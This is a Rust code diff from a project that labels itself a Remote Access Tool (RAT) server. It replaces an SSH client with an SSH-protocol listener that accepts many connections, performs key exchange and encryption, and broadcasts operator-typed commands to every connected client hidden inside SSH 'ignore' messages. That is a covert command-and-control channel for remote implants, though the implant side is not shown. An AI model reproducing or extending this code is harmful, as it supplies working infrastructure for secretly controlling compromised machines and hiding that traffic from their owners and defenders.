@@ -1,257 +1,160 @@
+mod cli;
+
 use std::error::Error;
-use std::io::{self, Write};
+use std::fs::File;
+use std::time::Duration;
 
 use clap::Parser;
-use common::cipher::hostkey::HostKeyAlgorithm;
-use log::{debug, info};
+use common::payloads::ignore::Ignore;
+use common::utils::write_string_vec;
+use env_logger::Target;
+use log::debug;
+use ssh_key::PrivateKey;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use tokio::net::TcpStream;
+use tokio::net::{TcpListener, TcpStream};
+use tokio::sync::broadcast;
 
 use common::cipher::encryption::chacha20_poly1305::ChaCha20Poly1305;
 use common::cipher::encryption::none::NoneCipher;
 use common::cipher::encryption::CipherCtx;
 use common::cipher::hostkey::rsa_sha2_512::RsaSha2512;
+use common::cipher::hostkey::{read_host_key, HostKeyAlgorithm};
 use common::cipher::kex::curve25519_sha256::Curve25519Sha256;
 use common::cipher::kex::KexAlgorithm;
 use common::config;
-use common::packets::Packet;
-use common::payloads::disconnect::Disconnect;
 use common::payloads::kex_ecdh_init::KexEcdhInit;
 use common::payloads::kex_ecdh_reply::KexEcdhReply;
 use common::payloads::kexinit::KexInit;
 use common::payloads::newkeys::NewKeys;
-use common::payloads::service_accept::ServiceAccept;
-use common::payloads::service_request::ServiceRequest;
-use common::payloads::userauth_failure::UserauthFailure;
-use common::payloads::userauth_request::{UserauthMethod, UserauthRequest};
 use common::payloads::PayloadFormat;
+use common::ssh::SSH;
 
-#[derive(Debug, Parser)]
-#[command(
-    long_about = "Remote Access Tool (RAT) server component",
-    propagate_version = true,
-    version
-)]
-pub struct Arguments {
-    /// The username to use for authentication
-    username: String,
-
-    /// Path to the private key file for authentication (`ssh-userauth` method name = "publickey").
-    #[arg(short, long)]
-    pub key: Option<String>,
-
-    /// Enable interactive authentication (`ssh-userauth` method name = "password").
-    #[arg(short, long)]
-    pub interactive: bool,
+async fn process(
+    stream: TcpStream,
+    host_key: Vec<u8>,
+    private_key: PrivateKey,
+    receiver: broadcast::Receiver<String>,
+) {
+    let _ = _process(stream, host_key, private_key, receiver).await;
 }
 
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn Error>> {
-    let arguments = Arguments::parse();
+async fn _process(
+    stream: TcpStream,
+    host_key: Vec<u8>,
+    private_key: PrivateKey,
+    mut receiver: broadcast::Receiver<String>,
+) -> Result<(), Box<dyn Error>> {
+    let mut ssh = SSH::<NoneCipher>::new(stream, CipherCtx::DUMMY, CipherCtx::DUMMY);
+    ssh.write_version_string(config::SSH_ID_STRING).await?;
+    let client_id_string = ssh.read_version_string(true).await?;
 
-    let mut log = colog::default_builder();
-    log.filter_level(log::LevelFilter::Debug);
-    log.init();
+    let server_kexinit_packet = ssh.write_payload(&KexInit::new()).await?;
+    let client_kexinit_packet = &ssh.read_packet().await?;
+    // TODO: Check supported algorithms
 
-    let mut stream = TcpStream::connect("localhost:22").await?;
+    let temp = ssh.read_packet().await?;
+    let temp = KexEcdhInit::from_packet(&temp).await?;
+    let client_ukey = temp.public_key();
 
-    stream.readable().await?;
-    let server_id_string = {
-        let mut buf = vec![];
-        loop {
-            let byte = stream.read_u8().await?;
-            buf.push(byte);
-            if byte == b'\n' {
-                let line = String::from_utf8(buf)?;
+    let key_pair = Curve25519Sha256::new("");
+    let shared_secret =
+        Curve25519Sha256::shared_secret(key_pair.private_seed.to_vec(), client_ukey.to_vec())?;
 
-                // Remove the CRLF (i.e. \r\n) characters
-                let trimmed = line.trim_end_matches("\r\n");
-                info!("{}", trimmed);
-
-                if line.starts_with("SSH-") {
-                    break Ok::<String, Box<dyn Error>>(String::from(trimmed));
-                }
-
-                buf = vec![];
-            }
-        }?
-    };
-
-    stream.writable().await?;
-    stream.write(config::SSH_ID_STRING.as_bytes()).await?;
-    stream.write(b"\r\n").await?;
-
-    let client_kexinit = KexInit::new();
-    let client_kexinit_packet = client_kexinit
-        .to_packet::<NoneCipher>(&CipherCtx::DUMMY)
-        .await?;
-    client_kexinit_packet
-        .to_stream(&CipherCtx::DUMMY, &mut stream)
-        .await?;
-
-    let server_kexinit_packet =
-        Packet::<NoneCipher>::from_stream(&CipherCtx::DUMMY, &mut stream).await?;
-
-    let key_pair = Curve25519Sha256::new();
-
-    let kex_ecdh_init = KexEcdhInit {
-        public_key: key_pair.public_key.clone(),
-    };
-    kex_ecdh_init
-        .to_packet::<NoneCipher>(&CipherCtx::DUMMY)
-        .await?
-        .to_stream(&CipherCtx::DUMMY, &mut stream)
-        .await?;
-
-    let server_kex_ecdh_reply = KexEcdhReply::from_packet(
-        &Packet::<NoneCipher>::from_stream(&CipherCtx::DUMMY, &mut stream).await?,
-    )
-    .await?;
-
-    info!(
-        "Host public key is {:?}",
-        server_kex_ecdh_reply.server_host_key,
-    );
-
-    let shared_secret = Curve25519Sha256::shared_secret(
-        key_pair.private_seed.to_vec(),
-        server_kex_ecdh_reply.public_key.clone(),
-    )?;
+    let mut server_host_key_payload = vec![];
+    write_string_vec(&mut server_host_key_payload, b"ssh-rsa").await;
+    server_host_key_payload.write_all(&host_key).await?;
 
     let exchange_hash = Curve25519Sha256::exchange_hash(
+        client_id_string.as_bytes(),
         config::SSH_ID_STRING.as_bytes(),
-        server_id_string.as_bytes(),
         &client_kexinit_packet.payload,
         &server_kexinit_packet.payload,
-        &server_kex_ecdh_reply.server_host_key_payload,
+        &server_host_key_payload,
+        client_ukey,
         &key_pair.public_key,
-        &server_kex_ecdh_reply.public_key,
         &shared_secret,
     )
     .await;
 
-    RsaSha2512::verify(
-        &server_kex_ecdh_reply.signature_algorithm,
-        &exchange_hash,
-        &server_kex_ecdh_reply.signature,
-        &server_kex_ecdh_reply.server_host_key,
+    let signature = match private_key.key_data() {
+        ssh_key::private::KeypairData::Rsa(keypair) => {
+            RsaSha2512::sign("rsa-sha2-512", &exchange_hash, keypair).await?
+        }
+        _ => unimplemented!(),
+    };
+    ssh.write_payload(
+        &KexEcdhReply::new(
+            "ssh-rsa".to_string(),
+            host_key,
+            key_pair.public_key.to_vec(),
+            "rsa-sha2-512".to_string(),
+            signature,
+        )
+        .await,
     )
     .await?;
 
-    let client_newkeys = NewKeys {};
-    client_newkeys
-        .to_packet::<NoneCipher>(&CipherCtx::DUMMY)
-        .await?
-        .to_stream(&CipherCtx::DUMMY, &mut stream)
-        .await?;
-
-    NewKeys::from_packet(&Packet::<NoneCipher>::from_stream(&CipherCtx::DUMMY, &mut stream).await?)
-        .await?;
+    ssh.write_payload(&NewKeys {}).await?;
+    let temp = ssh.read_packet().await?;
+    NewKeys::from_packet(&temp).await?;
 
     let session_id = &exchange_hash;
-
-    let mut send_ctx = CipherCtx::new::<Curve25519Sha256>(
-        3,
-        b'A',
-        b'C',
-        b'E',
-        &shared_secret,
-        &exchange_hash,
-        session_id,
-    )
-    .await?;
-    let mut receive_ctx = CipherCtx::new::<Curve25519Sha256>(
-        3,
-        b'B',
-        b'D',
-        b'F',
-        &shared_secret,
-        &exchange_hash,
-        session_id,
-    )
-    .await?;
-
-    let client_service_request = ServiceRequest {
-        service_name: String::from("ssh-userauth"),
-    };
-    client_service_request
-        .to_packet::<ChaCha20Poly1305>(&send_ctx)
-        .await?
-        .to_stream(&send_ctx, &mut stream)
+    let mut ssh = ssh
+        .switch_encryption::<Curve25519Sha256, ChaCha20Poly1305, true>(
+            &shared_secret,
+            &exchange_hash,
+            session_id,
+        )
         .await?;
-    send_ctx.seq += 1;
 
-    let server_service_accept = ServiceAccept::from_packet::<ChaCha20Poly1305>(
-        &Packet::<ChaCha20Poly1305>::from_stream(&receive_ctx, &mut stream).await?,
-    )
-    .await?;
-    receive_ctx.seq += 1;
-    debug!(
-        "SSH_MSG_SERVICE_ACCEPT: {:?}",
-        server_service_accept.service_name
-    );
-
-    let mut username = arguments.username;
-    let client_userauth_request = UserauthRequest {
-        username,
-        service_name: String::from("ssh-userauth"),
-        method_name: UserauthMethod::None,
-    };
-    client_userauth_request
-        .to_packet::<ChaCha20Poly1305>(&send_ctx)
-        .await?
-        .to_stream(&send_ctx, &mut stream)
-        .await?;
-    send_ctx.seq += 1;
-    username = client_userauth_request.username;
-
-    let server_userauth_failure = UserauthFailure::from_packet::<ChaCha20Poly1305>(
-        &Packet::<ChaCha20Poly1305>::from_stream(&receive_ctx, &mut stream).await?,
-    )
-    .await?;
-    receive_ctx.seq += 1;
-
-    debug!(
-        "SSH_MSG_USERAUTH_FAILURE: methods = {:?}, partial_success = {}",
-        server_userauth_failure.methods, server_userauth_failure.partial_success
-    );
-
-    if arguments.interactive {
-        print!("Enter password>");
-        io::stdout().flush()?;
-        let mut password = String::new();
-        io::stdin().read_line(&mut password)?;
-        password = password.trim().to_string();
-
-        let client_userauth_request = UserauthRequest {
-            username,
-            service_name: String::from("ssh-userauth"),
-            method_name: UserauthMethod::Password { password },
-        };
-        client_userauth_request
-            .to_packet::<ChaCha20Poly1305>(&send_ctx)
-            .await?
-            .to_stream(&send_ctx, &mut stream)
+    loop {
+        let command = receiver.recv().await?;
+        ssh.write_payload(&Ignore::new(command.as_bytes().to_vec()))
             .await?;
-        send_ctx.seq += 1;
-
-        let packet = Packet::<ChaCha20Poly1305>::from_stream(&receive_ctx, &mut stream).await?;
-        receive_ctx.seq += 1;
-
-        debug!("Response packet = {:?}", packet);
     }
+}
 
-    let client_disconnect = Disconnect {
-        reason_code: 11,
-        description: String::from("Disconnect normally"),
-        language_tag: String::from(""),
-    };
-    client_disconnect
-        .to_packet::<ChaCha20Poly1305>(&send_ctx)
-        .await?
-        .to_stream(&send_ctx, &mut stream)
-        .await?;
-    send_ctx.seq += 1;
+async fn interactive(sender: broadcast::Sender<String>) {
+    _interactive(sender).await;
+}
 
-    Ok(())
+async fn _interactive(sender: broadcast::Sender<String>) -> Result<(), Box<dyn Error>> {
+    let mut stdin = tokio::io::stdin();
+    loop {
+        let mut buffer = String::new();
+        loop {
+            let c = stdin.read_u8().await?;
+            if c == b'\n' || c == b'\r' {
+                break;
+            }
+
+            buffer.push(c as char);
+        }
+
+        debug!("Sending {:?}", buffer);
+        let _ = sender.send(buffer);
+    }
+}
+
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn Error>> {
+    let arguments = cli::Arguments::parse();
+
+    let mut log = colog::default_builder();
+    log.filter_level(log::LevelFilter::Debug);
+    log.target(Target::Pipe(Box::new(File::create(arguments.log_file)?)));
+    log.init();
+
+    let (ukey, rkey) = read_host_key(&arguments.host_key_file).await?;
+    let listener = TcpListener::bind(("0.0.0.0", arguments.port)).await?;
+
+    let (send, _) = broadcast::channel(100);
+    tokio::spawn(interactive(send.clone()));
+    loop {
+        let (socket, addr) = listener.accept().await?;
+        debug!("New client: {}", addr);
+
+        let receiver = send.subscribe();
+        tokio::spawn(process(socket, ukey.clone(), rkey.clone(), receiver));
+    }
 }
